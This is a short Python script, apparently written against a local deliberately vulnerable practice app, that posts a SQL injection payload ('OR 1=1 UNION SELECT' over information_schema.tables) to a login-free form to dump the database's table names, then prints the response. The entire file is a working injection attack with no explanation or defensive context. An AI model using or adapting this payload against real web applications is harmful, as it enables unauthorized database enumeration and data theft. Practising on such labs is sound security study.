import requests

data = {'id': "' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #", 'Submit': 'no empty input'}
print(data)
res = requests.post("http://localhost:4280/vulnerabilities/sqli", data=data)
print(res.text)